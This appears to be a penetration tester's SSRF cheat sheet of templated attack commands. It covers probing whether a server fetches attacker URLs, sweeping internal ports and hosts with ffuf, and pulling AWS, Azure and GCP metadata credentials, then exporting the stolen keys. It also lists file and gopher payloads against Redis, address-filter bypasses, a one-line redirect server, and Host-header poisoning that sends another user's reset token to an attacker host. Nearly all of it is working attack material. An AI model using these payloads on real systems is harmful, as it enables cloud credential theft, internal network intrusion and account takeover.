# SSRF

## Does the server fetch my URL
- [ ] Anything that takes a URL: webhooks, imports, link previews, PDF and image generators, an avatar by URL, a url field in JSON
sudo python3 -m http.server 80
curl -sk -G '<Scheme>://<WebHost>/THE-PAGE' --data-urlencode '<Param>=http://<LHOST>/ssrf-test'
- [ ] A request from the target in my server log, even with nothing on the page
- [ ] Its User-Agent: curl, python-requests, Java or a headless browser
- [ ] The response shown on the page, or only its size and time

## Localhost and its ports
curl -sk -G '<Scheme>://<WebHost>/THE-PAGE' --data-urlencode '<Param>=http://127.0.0.1/'
curl -sk -G '<Scheme>://<WebHost>/THE-PAGE' --data-urlencode '<Param>=http://127.0.0.1:<Port>/'
Every port, with THE-SIZE the response size a closed port gives, from port 1 first:
seq 1 65535 > ports.txt
ffuf -u '<Scheme>://<WebHost>/THE-PAGE?<Param>=http://127.0.0.1:FUZZ/' -w ports.txt -t 20 -fs THE-SIZE
- [ ] Admin panels, Redis on 6379, internal APIs, anything nmap showed filtered from outside

## Hosts on the inside
curl -sk -G '<Scheme>://<WebHost>/THE-PAGE' --data-urlencode '<Param>=http://<InternalIP>/'
A sweep of port 80, with THE-NET the first three octets of the inside network:
seq 1 254 > hosts.txt
ffuf -u '<Scheme>://<WebHost>/THE-PAGE?<Param>=http://THE-NET.FUZZ/' -w hosts.txt -t 20 -fs THE-SIZE

## Cloud metadata
Each as the value of <Param>, sent with --data-urlencode as above.
AWS, with no header needed:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/THE-ROLE
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
- [ ] 401 to a plain GET: IMDSv2, out of reach of an SSRF that only sends GET
- [ ] user-data read for passwords in the startup script
Keys found, on Kali:
export AWS_ACCESS_KEY_ID='THE-KEY-ID' AWS_SECRET_ACCESS_KEY='THE-SECRET' AWS_SESSION_TOKEN='THE-TOKEN'
aws sts get-caller-identity
Azure, with the header Metadata: true:
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
GCP, with the header Metadata-Flavor: Google:
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true
- [ ] Azure and GCP answer only when I can set that header

## Other schemes
file:///etc/passwd
file:///c:/windows/win.ini
dict://127.0.0.1:6379/INFO
gopher://127.0.0.1:6379/_INFO%0d%0a
- [ ] gopher works: a raw request to Redis, MySQL, SMTP or FastCGI inside, as Gopherus builds them
- [ ] file works: the LFI targets, source code and config files

## A filter on the address
http://127.1/
http://0/
http://[::1]/
http://2130706433/
http://0x7f000001/
http://localtest.me/
http://THE-ALLOWED-HOST@<LHOST>/
When only the first address is checked, my server redirects to the inside:
sudo python3 -c 'import http.server as h; R=type("R",(h.BaseHTTPRequestHandler,),{"do_GET":lambda s:(s.send_response(302),s.send_header("Location","http://127.0.0.1:<Port>/"),s.end_headers())}); h.HTTPServer(("0.0.0.0",80),R).serve_forever()'
curl -sk -G '<Scheme>://<WebHost>/THE-PAGE' --data-urlencode '<Param>=http://<LHOST>/'

## HTML the server renders
- [ ] A PDF or preview built from my input: these fetch from the server's side
<iframe src="http://127.0.0.1:<Port>/" width="1000" height="1000"></iframe>
<img src="http://<LHOST>/img-test">

## The Host header
A page kept for localhost:
curl -sk -i '<Scheme>://<WebHost>/THE-PAGE' -H 'Host: localhost'
A password reset whose link is built from the Host, sent for an account I own:
curl -sk -X POST '<Scheme>://<WebHost>/THE-PAGE' -d 'email=THE-EMAIL' -H 'Host: <LHOST>'
curl -sk -X POST '<Scheme>://<WebHost>/THE-PAGE' -d 'email=THE-EMAIL' -H 'X-Forwarded-Host: <LHOST>'
- [ ] The reset link in the mail points at me: another user's token comes to my server when they click
